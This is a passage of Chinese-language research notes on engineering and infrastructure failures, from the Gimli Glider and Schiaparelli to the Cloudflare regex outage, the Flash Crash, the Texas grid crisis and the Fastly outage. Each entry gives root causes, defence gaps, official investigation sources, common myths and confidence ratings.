  - 電話系統失效（latent）：席間/與鄰近管制中心的電話正維修不可用，德國 Karlsruhe 端雖試圖示警卻打不通，孤立了 Nielsen。
  - TCAS RA vs ATC 優先權模糊（latent，本案核心）：當年規章未明確「RA 必須優先於 ATC」，飛行員面對矛盾指令無唯一正解；Tu-154 依管制員、DHL 依 TCAS，兩者「各自合理」卻相加成災。
  - 文化/訓練分歧（latent）：部分機組（含俄方）訓練偏向以管制員指令為準，與 TCAS 設計前提（RA 應被遵循）相左。
- **官方調查 / 關鍵結論 + URL**: 德國 BFU（Bundesstelle für Flugunfalluntersuchung），*Investigation Report AX001-1-2/02*（2004-05）。主因：Skyguide 管制端的多項缺失（單人兼席、降級設備、電話失效、太晚察覺衝突）＋ TCAS 使用程序的模糊（RA 與 ATC 衝突時的優先權不明）。提出 19 項安全建議。後續 ICAO 於 2003-11 修訂規章，明定 TCAS RA 優先於 ATC 指令。BFU 報告（SKYbrary 條目）: https://skybrary.aero/bookshelf/bfu-investigation-report-ax001-1-202-uberlingen-mid-air ；報告全文 PDF（Glasgow 鏡像）: https://www.dcs.gla.ac.uk/~johnson/Eurocontrol/Ueberlingen/Ueberlingen_Final_Report.PDF ；事件概觀: https://en.wikipedia.org/wiki/2002_%C3%9Cberlingen_mid-air_collision
- **常見誤解 / 要校準的迷思**:
  - 「是俄國機組的錯（不該聽管制員、該聽 TCAS）」：最該校正的迷思。BFU 把主因指向 Skyguide 的系統性缺失（人力、降級設備、電話失效）＋當年 TCAS-vs-ATC 優先權的制度模糊；機組面對矛盾指令並無唯一明確正解。把它講成「俄國飛行員不守 TCAS」是倒果為因。
  - 「一個管制員打瞌睡/失職害的」：要校準——Nielsen 是被放在「一人兼兩席、雷達降級、電話不通」的不可能處境中，是組織與設備把單點變致命。
  - 「TCAS 失靈了」：錯。兩機 TCAS 都正確發出互補的 RA（一升一降）；失敗在「人未一致遵循 RA」與「規章沒說 RA 必須優先」。
  - 「管制員被殺是司法判決」：要校準——2004-02-24 喪妻失子的 Vitaly Kaloyev 私自闖入 Nielsen 住處將其刺殺，是私刑謀殺、非司法結果；這是本案的人性餘波，非調查結論。
- **信心**: ✔ rock-solid（BFU 一級報告；71 死、46 學童、單人兼席、雷達 fallback、電話失效、TCAS 一升一降、ICAO 2003-11 修訂 RA 優先皆多源一致）。

## 27. 金姆利滑翔機（Gimli Glider, Air Canada Flight 143, 1983-07-23）— 單位換算錯誤＋失動力滑降的韌性

- **日期 / 地點**: 1983-07-23，加拿大 Air Canada Flight 143，Boeing 767-233（C-GAUN），航線 Montreal-Dorval → Ottawa → Edmonton；於約 FL410（41,000 ft）巡航於安大略 Red Lake 上空時雙發失火（fuel exhaustion），無動力滑降至 Manitoba 省 Gimli 的前加拿大皇家空軍基地（RCAF Station Gimli，已改為賽車場）落地。✔（Wikipedia；Lockhart 調查委員會）
- **死傷 / 規模**: 機上 61 名乘客＋8 名機組，無人死亡、僅輕傷（落地時前起落架未鎖定而塌陷、機鼻觸地，反而增加摩擦助減速）。✔
- **技術根因（精確）**: 這架公制化的 767 其燃油量指示系統（FQIS, Fuel Quantity Indicator System）故障，地勤改以浮油尺（dripstick）人工量測油量、再換算重量。關鍵錯誤：換算時用了 1.77（單位為 lb/L，磅／升），而這架公制機應使用約 0.803 kg/L（公斤／升）的密度。錯用磅密度，使他們以為加足了所需油量，實際只裝了約一半：以為有約 22,300 kg、其實只有約 10,100 kg（約需求的 45%）。巡航中雙發先後因燃油耗盡熄火。失去主動力後，RAT（Ram Air Turbine，衝壓空氣渦輪）自動展開、提供有限的液壓與基本飛控。機長 Bob Pearson 是經驗豐富的滑翔機飛行員，以約 220 節下滑，並施展滑翔機技巧「forward slip（前向側滑）」大幅增加阻力、陡降而不增速，無動力滑降約 17 分鐘、約 183 km 後成功在 Gimli 跑道落地（當天該基地正辦賽車活動、跑道上有人車）。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 公制換算假設未被防呆（latent）：剛從英制改公制的機隊，人員對 kg/L vs lb/L 的密度因子混淆，無系統性二次校核攔截 1.77 vs 0.803 的錯誤。
  - FQIS 失效迫使人工量測（latent + trigger）：油量表故障，把「儀表自動讀數」降級為「人工浮油尺＋手算換算」，放大了人為換算出錯的機會。
  - 帶故障放行（latent）：在 FQIS 不正常的情況下仍放行起飛，依賴人工計算這條較脆弱的防線。
  - 多人各自確認卻同步犯錯（latent）：機師與地勤的交叉確認因為共用同一個錯誤密度因子而失效——「兩個人都算過」並未提供獨立性。
- **官方調查 / 關鍵結論 + URL**: 加拿大政府委任 Justice George Lockhart 主持的調查委員會（Board of Inquiry, 1985）。結論把責任指向 Air Canada 的「企業與設備層面缺失（corporate and equipment deficiencies）」，而非單一機組過失；並建議全面從英制轉為 SI 公制單位。事件概觀（含 FQIS、1.77 vs 0.803、RAT、forward slip、滑降距離）: https://en.wikipedia.org/wiki/Gimli_Glider
- **常見誤解 / 要校準的迷思**:
  - 「飛行員加錯油，笨」：要校準——這既是「單位/假設錯誤」（用了 lb/L 密度），也是「FQIS 故障迫使人工計算＋帶病放行＋交叉確認共用同一錯誤」的系統失敗；Lockhart 委員會把主責歸於公司與設備，不是釘單一人。
  - 「兩具引擎故障」：錯。引擎沒壞，是燃油耗盡（fuel exhaustion）導致熄火；油是「以為夠、其實只有一半」。
  - 「靠運氣降落」：要校準——化險為夷的核心是 Pearson 的滑翔機經驗（forward slip）、副駕對 Gimli 跑道的熟悉，以及 RAT 提供的最低限度液壓；這是「韌性/airmanship」正面案例（可與 Apollo 11 對照），不是純運氣。
  - 「767 全靠液壓飛、沒電/沒油就完全失控」：要校準——RAT 在失去主動力時自動提供有限液壓與基本操縱，讓深度降級下仍可控；這正是「優雅降級」的硬體版。
- **信心**: ✔ rock-solid（1.77 lb/L vs 0.803 kg/L、22,300 kg 需求 vs 10,100 kg 實裝、FL410、約 183 km 滑降、RAT、forward slip、零死亡、Lockhart 委員會結論皆有來源一致）。⚠️ 滑降距離各源約 100–183 km、滑降時間約 17 分鐘，書寫時用「約 17 分鐘、超過 150 km」較穩。

## 28. Schiaparelli 火星著陸器（ExoMars EDM, 2016-10-19）— IMU 飽和→負高度→誤判已著陸

- **日期 / 地點**: 2016-10-19，ESA ExoMars 2016 任務的 EDM（Entry, Descent and Landing Demonstrator Module, 名 Schiaparelli）於火星 Meridiani Planum 進行進入-下降-著陸（EDL）時墜毀。✔（ESA Anomaly Inquiry Board 報告）
- **死傷 / 規模**: 無人傷亡（無人探測器）。著陸器全毀；以約 540 km/h（約 150 m/s）撞擊火表，NASA 的 Mars Reconnaissance Orbiter 影像拍到撞擊坑。ExoMars 2016 的另一部分（Trace Gas Orbiter, TGO）成功入軌、任務主目標達成；Schiaparelli 為技術示範件。✔（無傷亡；撞擊速度見下方校準）
- **技術根因（精確）**: 降落傘張開後，著陸器經歷比預期更劇烈的擺盪，使 IMU（Inertial Measurement Unit，慣性量測單元）的角速率量測達到飽和（saturation，超出可量測上限），且此飽和持續時間約 1 秒（超出設計預期；各來源約 1 秒，ESA 公開摘要與多數報導採此值）。GNC（Guidance, Navigation & Control）軟體把這段飽和的姿態/角速率資料積分進導航解算，產生了一個錯誤的姿態估計，進而算出一個「負的高度（below ground level）」。系統據此「以為自己已經（或即將）著陸」：於是提前釋放降落傘與背殼（backshell）、僅短暫點燃減速推進器約 3 秒、隨即切換到「地面模式（on-ground mode）」並啟動本應落地後才做的動作——但此時著陸器其實還在約 3.7 km 高空。失去減速後自由墜落、以約 540 km/h 撞地。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 對降落傘動態的建模不足（latent）：對傘下擺盪幅度的電腦模擬不足，未預期 IMU 會被擺盪推到飽和。
  - IMU 飽和上限設定與後續處理不當（latent，本案核心）：飽和門檻設定使量測在劇烈擺盪下達上限，且 GNC 對「飽和/異常的 IMU 資料」缺乏穩健處理（未做合理性檢查就積分），讓壞資料一路變成負高度。
  - 缺乏對「不可能的高度」的合理性把關（latent）：軟體未對「負高度」這種物理上不可能的解算結果設防護或拒絕，直接據以觸發釋傘/落地序列。
  - 故障偵測文化與分包管理不足（latent）：Inquiry Board 指團隊在偵測此類故障的態度不足，且分包商管理有問題，使缺陷未在驗證中被攔下。
- **官方調查 / 關鍵結論 + URL**: ESA 設立由 Inspector General 主持的外部獨立 Schiaparelli Anomaly Inquiry Board，報告於 2017 年發布。根因鏈：降落傘擺盪→IMU 角速率飽和（持續超出預期）→GNC 積分出錯誤姿態與「負高度」→提前釋傘/釋背殼、推進器僅點火約 3 秒、切到地面模式→在約 3.7 km 高空自由墜落。並列出建模不足、飽和處理不當、故障偵測與分包管理等根因。Inquiry 報告 PDF: https://sci.esa.int/documents/33431/35950/1567260317467-ESA_ExoMars_2016_Schiaparelli_Anomaly_Inquiry.pdf ；ESA 調查完成新聞: https://www.esa.int/Science_Exploration/Human_and_Robotic_Exploration/Exploration/ExoMars/Schiaparelli_landing_investigation_completed
- **常見誤解 / 要校準的迷思**:
  - 「降落傘沒打開/降落傘故障」：錯。降落傘正常張開了；致命的是傘下擺盪使 IMU 飽和、軟體誤算高度，反而「太早」把傘丟掉。
  - 「感測器壞了」：要校準——IMU 沒壞，是「被推到量測上限（飽和）」這個合法但異常的狀態；真正缺陷是軟體對飽和資料的處理（積分成負高度而不質疑）。
  - 「電腦算出負高度只是一個 bug」：不完整。是「建模不足→飽和→積分壞解→無合理性把關」的鏈條，且這套 GNC 軟體未經足以暴露此情境的測試（與 Ariane 5、MCO 同類：壞輸入＋缺乏防護＋驗證不足）。
  - 「整個 ExoMars 2016 失敗了」：錯。主目標 TGO 成功入軌；Schiaparelli 是著陸技術示範件，其失敗提供了 EDL 教訓。
- **信心**: ✔ 技術根因 rock-solid（ESA Inquiry 一級報告；IMU 飽和→負高度→提前釋傘/約 3 秒推進器/約 3.7 km/約 540 km/h 皆有來源）。飽和持續時間採「約 1 秒（超出設計預期）」——ESA 公開摘要與多數報導採此值；書寫時以「飽和持續超出預期時間」表述，不釘死秒數。

## 29. Sleipner A 平台沉沒（1991-08-23）— 有限元素分析低估剪應力

- **日期 / 地點**: 1991-08-23，挪威 Stavanger 附近的 Gandsfjord 峽灣；Condeep 型混凝土重力式基礎結構（concrete gravity base structure），由 Norwegian Contractors 為 Statoil（今 Equinor）建造，正進行 deck mating 前的受控壓載（ballasting）/浮力測試。✔（Wikipedia；SINTEF 調查）
- **死傷 / 規模**: 無人傷亡（無人受控測試）。整座混凝土基礎結構在下沉測試中於水深約 65 m 處一面 cell 牆破裂、進水後以約每分鐘 1 m 下沉並內爆（implode），碰底時的衝擊產生約 Richter 3.0 規模的地震訊號。財務損失通常引為「約 7 億美元」⚠️（亦見不同 NOK 估值；此數字常見於工程教案，非單一官方報告逐字數字，書寫標「估計約 7 億美元」）。✔（無傷亡、約 65 m、約 1 m/min、規模約 3.0 為多源一致）/ ⚠️（金額）
- **技術根因（精確）**: 結構中的 tricell（三胞元，三座圓筒儲格交會處的三角形 cell，屬壓載/浮力系統的一部分）牆體在深水靜水壓下承受高剪應力。設計時用 NASTRAN 做的有限元素分析（FEA）對 tricell 牆的剪應力嚴重低估——調查確認壓載室的應力被低估約 47%；加上採用偏不保守的混凝土規範，使部分混凝土牆「太薄、配筋不足」，無法承受下沉到該深度時可預見的靜水壓。於是在約 65 m 深度，tricell 牆先破裂進水，迅速失去浮力而沉沒、內爆。FEA 網格在 tricell 幾何的應力集中處過粗、未捕捉真實剪力分布，是經典的「模型解析度不足→低估關鍵應力」案例。
- **防禦的孔洞（Swiss-cheese holes）**:
  - FEA 模型在關鍵幾何處過粗（latent，本案核心）：NASTRAN 模型對 tricell 三角交會處的剪應力解析不足，系統性低估約 47%，把不安全的設計算成「安全」。
  - 偏不保守的混凝土規範（latent）：採用的混凝土設計規範本身偏不保守，與低估的應力相疊加，使安全裕度被雙重侵蝕。
  - 配筋/牆厚不足、無裕度（latent）：據錯誤的低應力設計，牆做得太薄、剪力配筋不足，對「可預見的靜水壓」毫無餘裕。
  - 對「分析結果」過度信任、缺乏獨立校核（latent）：對 FEA 輸出未做足夠的獨立驗證或局部精細複算，分析誤差直接變成製造缺陷（與 MCO、Ariane 同類：相信軟體輸出而無端到端把關）。
- **官方調查 / 關鍵結論 + URL**: 事故後 Statoil 設調查小組、委由挪威 SINTEF 擔任技術顧問調查。結論：根因為 NASTRAN/FEA 對 tricell 牆剪應力的不準確計算（低估約 47%）＋偏不保守的混凝土設計，導致牆體在靜水壓下破壞。事件概觀（含 47%、65 m、規模 3.0、無傷亡、SINTEF）: https://en.wikipedia.org/wiki/Sleipner_A ；技術整理（學界/教案）: https://link.springer.com/chapter/10.1007/978-94-011-1046-4_3
- **常見誤解 / 要校準的迷思**:
  - 「混凝土品質差/施工偷工」：錯。問題在設計階段的 FEA 低估剪應力、致牆「按錯誤的低需求」做得太薄；不是施工品質或材料瑕疵。
  - 「平台在使用中倒塌、死了人」：錯。是在「安裝前的受控下沉測試」中沉沒、且無人傷亡；它是「測試階段就暴露設計缺陷」（相對幸運）。
  - 「就是軟體（NASTRAN）的 bug」：要校準——NASTRAN 本身沒有 bug；是「模型網格在應力集中處過粗＋偏不保守規範＋無獨立校核」這組工程使用方式的失敗，是「人怎麼用工具」而非工具壞了。
  - 「47% 是隨便估的」：要校準——47% 是調查對 tricell 牆剪應力低估幅度的確認值，是本案最具代表性的數字。
- **信心**: ✔ 技術根因 rock-solid（SINTEF 調查；低估約 47%、tricell 剪應力、NASTRAN/FEA、約 65 m、規模 3.0、無傷亡多源一致）。⚠️ 僅財務損失金額（約 7 億美元）為估計、非單一官方逐字數字。

## 30. Cloudflare 大當機（2019-07-02）— WAF 正則式災難性回溯使 CPU 100%

- **日期 / 地點**: 2019-07-02，13:42 UTC 起、14:09 UTC 恢復；全球 Cloudflare 代理網路。✔（Cloudflare 官方 postmortem）
- **死傷 / 規模**: 無傷亡。全球代理服務中斷約 27 分鐘；中斷期間全球流量驟降約 80%、大量請求回傳 502 錯誤；影響 Discord、Shopify、Notion、Glassdoor 等大量網站。✔（27 分鐘、80% 流量損失皆官方）
- **技術根因（精確）**: Cloudflare 部署了一條新的 WAF（Web Application Firewall）Managed Rule，其中一段正則表達式含有 catastrophic backtracking（災難性回溯）。問題正則為 `(?:(?:\"|'|\]|\}|\\|\d|(?:nan|infinity|true|false|null|undefined|symbol|math)|\`|\-|\+)+[)]*;?((?:\s|-|~|!|{}|\|\||\+)*.*(?:.*=.*)))`，致命片段是末端的 `.*(?:.*=.*)`——當輸入字串較長時，PCRE 引擎為了匹配此巢狀的貪婪 `.*` 會嘗試指數級數量的回溯路徑，CPU 飆到接近 100%。此規則經 Cloudflare 的 Quicksilver（全球秒級分發的鍵值散布系統）一次性推送到全球所有節點，未經分階段/金絲雀發布；且數週前一次 WAF 重構時，本應限制單一正則 CPU 用量的保護被誤移除，使這條失控正則沒有 CPU 上限可兜底。結果全球代理進程 CPU 被吃光、無法處理正常流量。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 正則 CPU 保護被誤刪（latent，本案核心）：數週前 WAF 重構移除了限制正則 CPU 用量的保護，使「失控正則」失去最後的資源兜底——脆弱性在事發前就潛伏。
  - Lua WAF 用 PCRE、回溯無複雜度保證（latent）：底層正則引擎用回溯式匹配、對指數級回溯無內建防護，本質上對 catastrophic backtracking 不設防。
  - WAF 規則全球一次性推送、無金絲雀（latent）：Managed Rule 經 Quicksilver 秒級推全球、未分批，缺陷一上線即全球同時爆（與 CrowdStrike 同型）。
  - 把「規則/設定」當資料而非程式碼（latent）：WAF 規則雖視為設定，實質會驅動執行期計算（正則匹配吃 CPU），卻未套用與程式碼同等的灰度發布與效能測試。
- **官方調查 / 關鍵結論 + URL**: Cloudflare 官方 postmortem（CTO John Graham-Cumming，2019-07-12）*Details of the Cloudflare outage on July 2, 2019*。結論：一條 WAF 規則的正則 catastrophic backtracking 使全球 CPU 飆滿；以「全域關閉 WAF（global WAF kill switch / global terminate）」於 14:07 UTC 止血、14:09 UTC 恢復。並坦承 Quicksilver 跳過了分階段發布、且先前誤移除了 CPU 保護。官方 postmortem: https://blog.cloudflare.com/details-of-the-cloudflare-outage-on-july-2-2019/
- **常見誤解 / 要校準的迷思**:
  - 「Cloudflare 被 DDoS/被駭」：錯。是自家 WAF 規則的正則缺陷造成的自我 CPU 耗盡，無外部攻擊（事發初期一度被懷疑為攻擊）。
  - 「就是一條爛正則」：要校準——正則是觸發，真正放大的是「CPU 保護被誤移除＋回溯式引擎無複雜度保證＋全球一次性推送無金絲雀」這組防禦缺口。
  - 「跟 2020 BGP 或 2025 設定檔那次是同一件」：錯。需區分——2019-07-02 是「正則/CPU」事件；Cloudflare 另有 2020 的 BGP 路由事件與 2025-11 的設定檔事件，三者根因不同。
  - 「永久關掉 WAF 才修好」：要校準——是用「全域 kill switch 暫時關 WAF」止血、移除壞規則後再恢復，非永久關閉。
- **信心**: ✔ rock-solid（Cloudflare 官方 postmortem 逐項核對；27 分鐘、13:42–14:09 UTC、80% 流量損失、正則原文、Quicksilver 全球推送、CPU 保護被誤刪皆官方）。

## 31. 2010 閃電崩盤（Flash Crash, 2010-05-06）— 大型賣出演算法×HFT 撤離流動性

- **日期 / 地點**: 2010-05-06，美東時間（ET）約 14:32 起急跌、約 14:45–14:47 觸底、約 15:07 前大致回復；美國股市（DJIA／E-mini S&P 500 期貨等）。✔（CFTC-SEC 聯合報告）
- **死傷 / 規模**: 無傷亡。DJIA 盤中急跌約 998–1,000 點（約 9%）、數分鐘內蒸發約 1 兆美元名目市值，並在約 36 分鐘內大致收復；當日收盤 DJIA 仍跌約 3.2%（約 348 點）。部分個股一度成交於荒謬價位（如 1 美分或 10 萬美元）。✔（約 1,000 點/約 9%/約 1 兆/約 36 分鐘為多源一致）
- **技術根因（精確）**: CFTC-SEC 聯合報告（2010-09-30）指觸發為一筆大型自動賣出程式：一家基本面交易者（廣泛報導為 Waddell & Reed）為對沖既有股票部位，下單賣出 75,000 口 E-mini S&P 500 期貨、名目約 41 億美元；其演算法採「成交量參與率（volume-participation）」的粗略邏輯——以「占當下成交量某百分比」的速度灌出賣單，但對價格、時間、市場能否吸收皆不設限制。在已然脆弱、波動升高的市場中，這筆賣壓約 20 分鐘內傾洩（正常需數小時）。高頻交易者（HFT）先買進這些合約、隨即彼此快速轉手（被形容為 hot-potato「燙手山芋」效應），未提供真實流動性反而抽走流動性；多家造市商與 HFT 因觸發自身風控而暫停或退出，買盤瞬間枯竭，價格自由落體。隨後流動性回補、價格快速反彈。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 賣出演算法無價格/時間上限（latent，本案核心）：volume-participation 演算法只盯「占成交量百分比」，不看價格、不看時間、不看市場深度，在波動放大時越賣越快、自我加速。
  - HFT 流動性是「會跑的流動性」（latent）：HFT 在壓力下不是緩衝而是放大器——撤單、互相轉手（hot-potato），把表面充沛的流動性在數秒內抽乾。
  - 跨市場無協調的暫停機制（latent）：當時缺乏跨股/跨市場的統一熔斷，個股價格可瞬間崩到荒謬價位而無煞車。
  - 緊耦合＋自動化連鎖（latent）：期貨與現貨、各演算法彼此即時連動，單一大單的衝擊在毫秒級跨市場傳染、無阻尼。
- **官方調查 / 關鍵結論 + URL**: U.S. CFTC & SEC 聯合報告 *Findings Regarding the Market Events of May 6, 2010*（2010-09-30）。結論：觸發為大型 E-mini 賣出程式（volume-participation、無價格/時間限制），與 HFT 的 hot-potato 互動致流動性瞬間枯竭。後續監管引入單股熔斷、繼而是 Limit Up-Limit Down（LULD）機制。報告 PDF: https://www.sec.gov/files/marketevents-report.pdf ；後續學術/補充分析（CFTC）: https://www.cftc.gov/sites/default/files/idc/groups/public/@economicanalysis/documents/file/oce_flashcrash0314.pdf
- **常見誤解 / 要校準的迷思**:
  - 「是 Navinder Sarao 一個人用 spoofing 搞垮市場」：要校準（歸因有爭議）。Sarao 於 2015 年因 spoofing（掛大量假賣單再撤）被起訴、2020 年僅判一年居家監禁；但 2010 年 CFTC-SEC 報告並不依賴 Sarao 的存在來解釋崩盤，學界亦指「政策應依聯合報告、而非把全責歸 Sarao」。書寫時應寫「觸發為大型賣出演算法×HFT 撤離流動性；Sarao 的 spoofing 是否、以及多大程度上助長，仍有爭議」並標 ⚠️。
  - 「HFT 提供流動性、讓市場更穩」：要校準——當天 HFT 的流動性在壓力下迅速撤離、互相轉手，反而放大崩跌；這是「流動性幻覺」的經典案例。
  - 「市場真的蒸發了 1 兆」：要校準——是盤中名目市值短暫蒸發約 1 兆、約 36 分鐘內大致收復；非永久損失，重點在「速度與機制」而非最終跌幅。
  - 「就是 Waddell & Reed 故意砸盤」：錯。那是合法的對沖賣出，問題在演算法設計（無價格/時間限制）與市場結構，非惡意。
- **信心**: ⚠️ 機制 rock-solid（CFTC-SEC 一級報告；約 1,000 點/9%/1 兆/36 分鐘、E-mini 75,000 口/約 41 億、volume-participation、hot-potato 皆官方）。歸因有爭議：Sarao 的 spoofing 貢獻程度未定論，須以「觸發＝大型賣出演算法×HFT；Sarao 角色有爭議」表述。

## 32. 德州電網大停電（Winter Storm Uri, ERCOT, 2021-02-14~19）— 未做防寒的偏差正常化＋孤島電網

- **日期 / 地點**: 2021-02-14 至 19，北極寒潮 Winter Storm Uri 橫掃德州；ERCOT（Electric Reliability Council of Texas）管理的近乎孤島的德州電網。✔（FERC/NERC 聯合報告）
- **死傷 / 規模**: 逾 450 萬戶（約 4.5 million customers）停電，部分長達約 4 天；ERCOT 為避免全網不可控崩潰，實施美國史上最大規模的人為強制減載（最嚴重時約 20,000 MW、約占當時負載 45%，持續近三日，並非短暫「rolling」而是長時間維持）。死亡人數有爭議⚠️：德州官方/州衛生部門統計約 210–246 死（直接＋間接），多項研究估計含間接死亡可達約 700（一說 702）；經濟損失估計約 800–1,300 億美元（$80B–$130B）⚠️。ERCOT 事後稱電網一度距離「完全黑啟動（black start，恐需數週才能恢復）」僅約 4 分 37 秒。✔（4.5M 戶、約 20,000 MW、近 4 分 37 秒為報告/ERCOT 數字）/ ⚠️（死亡與損失金額為範圍）
- **技術根因（精確）**: 極端低溫直接凍結天然氣井口（wellhead）、集氣與處理設施與發電機組；同一寒潮下供暖需求飆升，發電端卻因凍結/燃料供應中斷而大量跳機。FERC/NERC 報告：2/16 約 30,500 MW 停機容量中約 18,000 MW 為天然氣發電，其中約 72% 因燃料供應問題；凍結問題占非計畫停機的約 44.2%、燃料問題約 31.4%。天然氣產量在 2/17 一度較常態下降約 71%、處理量 2/15 一度下降約 82%。電力與天然氣的相互依賴形成循環依賴：發電需要天然氣，而天然氣的開採/加壓/處理又需要電力——停電使氣田更難供氣、缺氣又使更多電廠停機。ERCOT 為防止頻率崩到觸發保護、引發全網不可控的連鎖跳脫（black start），被迫長時間大規模甩負載。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 防寒（winterization）長期未強制（latent，本案核心，偏差正常化）：德州在 2011 年（甚至 1989 年）的寒潮事件後已被點名「需強化防寒」，但機組防寒在德州非強制、無最低標準；「歷次沒釀大災」侵蝕了動機——典型 normalization of deviance。
  - 近乎孤島的電網、跨區連結有限（latent）：ERCOT 為避免聯邦監管而刻意與東/西兩大互聯網少有連結，缺電時幾乎無法從鄰區大量輸入電力來補缺口。
  - 氣電相互依賴的循環依賴（latent）：發電靠天然氣、天然氣生產又靠電力，停電與缺氣互相惡化，無人把「氣電耦合」當成單一系統來規劃韌性。
  - 需求側同步飆升（trigger）：嚴寒使電熱負荷暴增，與供給端崩潰同時發生，供需缺口在最冷時刻最大。
  - 接近不可控崩潰、餘裕極小（trigger 放大）：系統一度距 black start 僅約 4 分 37 秒，留給操作員的處置窗口極短，只能靠長時間強制甩負載硬撐。
- **官方調查 / 關鍵結論 + URL**: FERC（Federal Energy Regulatory Commission）與 NERC（North American Electric Reliability Corporation）2021 年聯合調查的最終報告（2021-11 發布），含 28 項正式建議，核心指向發電機組防寒不足與氣電協調不足。FERC 新聞稿（最終報告）: https://www.ferc.gov/news-events/news/final-report-february-2021-freeze-underscores-winterization-recommendations ；事件概觀（含死亡範圍、損失估計）: https://en.wikipedia.org/wiki/2021_Texas_power_crisis
- **常見誤解 / 要校準的迷思**:
  - 「是再生能源（風機結冰）害的」：要校準——FERC/NERC 數據顯示停機主力是天然氣等熱力發電（2/16 停機容量約 18,000 MW 為天然氣、約 72% 因燃料供應），凍結與燃料問題遍及各種能源；把責任全推給風電不符報告。
  - 「只是『輪流停電（rolling blackouts）』、一下就好」：要校準——是持續近三日、最嚴重約 20,000 MW（約 45% 負載）的長時間強制甩負載，目的是避免「完全失控的全網崩潰」；不是輕描淡寫的輪流停電。
  - 「死了 200 多人」：要校準（爭議）——州官方統計約 210–246，但含間接死亡的研究估計可達約 700；應給範圍並標 ⚠️。
  - 「天有不測風雲、純屬天災」：要校準——寒潮是觸發，但「2011/1989 已警告卻未強制防寒」是偏差正常化，「孤島電網無法輸入」是結構選擇，「氣電循環依賴」是規劃盲點；這是可預防的系統性失敗。
- **信心**: ✔ 機制與系統根因 rock-solid（FERC/NERC 一級報告＋ERCOT 數字；4.5M 戶、約 20,000 MW/45%、約 4 分 37 秒、天然氣停機占比、防寒未強制、2011 前例皆有來源）。⚠️ 死亡人數（約 210–246 官方 vs 約 700 研究）與經濟損失（約 $80B–$130B）為範圍/估計，須給區間並標 ⚠️。

## 33. Fastly 大當機（2021-06-08）— 潛伏 bug 被一筆合法客戶設定觸發

- **日期 / 地點**: 2021-06-08，09:47 UTC 起；全球 Fastly CDN（邊緣網路）。✔（Fastly 官方 postmortem）
- **死傷 / 規模**: 無傷亡。客戶可感知的服務中斷約一小時（多數服務於約 11:00 UTC 前後恢復），但自起始（09:47）到完全緩解（12:35 UTC）約 2 小時 48 分；中斷期間約 85% 的 Fastly 網路回傳錯誤；連帶拖垮 Amazon、Reddit、紐約時報（NYT）、英國政府網站（gov.uk）等大量站點。✔（85%、約一小時客戶影響、Fastly 一分鐘內偵測皆官方）
- **技術根因（精確）**: 2021-05-12 Fastly 部署了一版軟體，其中引入了一個潛伏（latent/dormant）缺陷——只在「特定客戶設定」遇上「特定情境」時才會被觸發，部署後潛伏數週未顯。2021-06-08 早上，一名客戶推送了一筆「合法有效（valid）」的設定變更，恰好滿足了觸發該潛伏 bug 的特定條件，使缺陷被喚醒：一個 edge 節點崩潰，並透過共享的設定服務擴散，導致全球約 85% 的網路回傳錯誤（多為 503/服務不可用）。Fastly 在約一分鐘內（09:48）偵測到、辨識並隔離原因、停用該設定；在約 49 分鐘內讓 95% 的網路恢復正常；當日 17:25 UTC 開始部署永久修補。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 潛伏 bug 未被測試暴露（latent，本案核心）：5/12 部署引入的缺陷在一般情境下不顯，現有測試/驗證未涵蓋「特定客戶設定×特定情境」這條觸發路徑，使其潛伏數週成為定時炸彈（與 Knight 的休眠死碼同型）。
  - 合法輸入即可引爆（latent）：觸發者是「合法有效的設定變更」，非惡意/非畸形輸入；系統未對「合法但會引爆潛伏缺陷的組態」設防（呼應「可信來源≠可信內容」）。
  - 一個 edge 崩潰經共享設定服務擴散（latent）：單節點崩潰沒有被隔離，反而透過共享的設定散布管道擴散到全網——缺乏爆炸半徑隔離（與級聯主題一致）。
  - Fastly 自承未預期此類失效（latent）：postmortem 坦承「我們應該要能預期到這種失效」，即缺乏對此失效模式的事前想像與防護。
- **官方調查 / 關鍵結論 + URL**: Fastly 官方事後說明 *Summary of June 8 outage*（Nick Rockwell）。結論：5/12 部署引入潛伏 bug，6/8 一筆合法客戶設定觸發、使約 85% 網路回傳錯誤；一分鐘內偵測、約 49 分鐘內 95% 恢復；後續加上對此類觸發的修補與更嚴格的部署檢測。官方 postmortem: https://www.fastly.com/blog/summary-of-june-8-outage
- **常見誤解 / 要校準的迷思**:
  - 「是那位客戶設定錯了/客戶的錯」：錯。客戶推的是「合法有效」的設定；錯在 Fastly 自家 5/12 引入、潛伏數週未被測出的 bug——客戶的合法操作只是「踩到地雷」的腳。
  - 「Fastly 被攻擊/被駭」：錯。是自家潛伏軟體缺陷被合法設定觸發，無外部攻擊。
  - 「中斷只有一小時」：要校準——客戶可感知影響約一小時、Fastly 一分鐘內偵測且 49 分鐘內 95% 恢復；但自起始到完全緩解約 2 小時 48 分（09:47→12:35 UTC）。書寫時用「約一小時的全球性嚴重中斷，數十分鐘內大致恢復」較貼合多數讀者印象，並可註明完全緩解的較長時間。
  - 「一次部署當下就爆」：要校準——bug 在 5/12 就部署進去、潛伏了近一個月，6/8 才被特定設定觸發；危險在「潛伏期」而非部署當下。
- **信心**: ✔ rock-solid（Fastly 官方 postmortem 逐項核對；5/12 引入潛伏 bug、6/8 合法客戶設定觸發、85% 網路回錯、一分鐘偵測、49 分鐘內 95% 恢復皆官方）。⚠️ 僅「中斷時長」依「客戶影響 vs 完全緩解」口徑不同（約 1 小時 vs 約 2h48m），書寫時說清是哪一個。

---

# I. 第三輪增補（靜默資料損毀，2026-06-13）

## 34. 溫哥華證券交易所指數截斷誤差（Vancouver Stock Exchange Index, 1982–1983）

- **日期 / 地點**: 指數於 1982-01 設立、基值 1000.000；誤差累積至 1983-11-25（週五）收盤後修正。加拿大溫哥華。✔
- **死傷 / 規模**: 無人傷亡。規模＝指數在約 22 個月內由 1000 默默漂移到 **524.881**，而「真值」應約 **1009.811**——即顯示值僅約真值的一半。1983-11-25 修正後重新開盤跳回 **1098.892**（差額純粹來自修掉這個 bug）。✔（多源一致：in.tum.de/Huckle 整理、B. D. McCullough 分析、當代 Toronto Star 報導）
